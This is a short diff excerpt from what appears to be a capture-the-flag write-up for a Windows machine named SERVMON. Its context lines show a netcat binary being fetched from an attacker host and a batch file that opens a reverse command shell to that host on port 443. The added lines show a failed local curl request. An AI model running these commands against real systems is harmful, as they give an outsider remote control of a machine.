@@ -1265,3 +1265,8 @@ nadine@SERVMON C:\ProgramData>curl 10.10.15.132:8011/nc.exe -o nc.exe
 nadine@SERVMON C:\ProgramData>echo c:\programdata\nc.exe -e cmd 10.10.15.132 443
  >  shell.bat 
 ```
+___________
+```
+[★]$ curl https://127.0.0.1:8443
+curl: (35) OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to 127.0.0.1:8443 
+```
